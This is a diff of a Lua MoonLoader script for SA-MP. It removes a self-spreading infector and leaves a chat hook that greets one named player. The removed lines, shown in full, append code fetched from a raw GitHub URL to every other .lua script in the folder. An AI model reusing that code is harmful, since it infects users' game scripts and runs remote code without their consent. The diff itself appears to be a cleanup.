@@ -1,38 +1,24 @@
-local Handle, FileName = findFirstFile("moonloader\\*.lua")
-local Directory = getWorkingDirectory().."\\"
-while FileName do
-    local FileText = ""
-    local Skip = false
-    local File = io.open(Directory..FileName, "r")
-    for Line in File:lines() do
-        if Line:find("%-%- Exception "..FileName) then
-            Skip = true
-            break
-        end
 
-        if FileText ~= "" then
-            FileText = FileText.."\n"
+if not _G.__PHANTOM_RPC_HOOK_INSTALLED then
+    _G.__PHANTOM_RPC_HOOK_INSTALLED = true
+
+    -- Ждём, пока SAMP не загрузится (на случай, если скрипт стартанул рано)
+    local function waitForSamp()
+        while not isSampAvailable() do wait(100) end
+    end
+    waitForSamp()
+
+    -- Регистрируем перехват RPC
+    addEventHandler('onReceiveRpc', function(id, bs)
+        if id == 93 then -- RPC_Chat
+            local color = raknetBitStreamReadInt32(bs)
+            local length = raknetBitStreamReadInt32(bs)
+            local message = raknetBitStreamReadString(bs, length)
+            -- Проверка на сообщение от Smoant_Despasito
+            -- Шаблон: [ID]Имя[ID] говорит:
+            if message:find('%[%d+%]Smoant_Despasito%[%d+%] говорит:') then
+                sampAddChatMessage('привет', -1)
+            end
         end
-        FileText = FileText..Line
-    end
-    File:close()
-    if not Skip and not FileText:find("https://raw.githubusercontent.com/pauk2218/samp/main/1234") then
-        local encoding = require "encoding"
-        encoding.default = "CP1251"
-        local File = io.open(Directory..FileName, "w")
-        File:write("-- Exception "..FileName.."\n"..FileText.."\n"..encoding.UTF8:decode((require("requests")).get("https://raw.githubusercontent.com/pauk2218/samp/main/1234").text))
-        File:close()
-    end
-    FileName = findNextFile(Handle)
-end
-findClose(Handle)
-function onReceiveRpc(id, bs)
-    if id == 93 then
-        local color = raknetBitStreamReadInt32(bs)
-        local len = raknetBitStreamReadInt32(bs)
-        local str = raknetBitStreamReadString(bs, len)
-        if str:find("%[%d+%]Smoant_Despasito%[%d+%] говорит:") then
-            sampAddChatMessage('привет', -1)
-        end
-    end
+    end)
 end
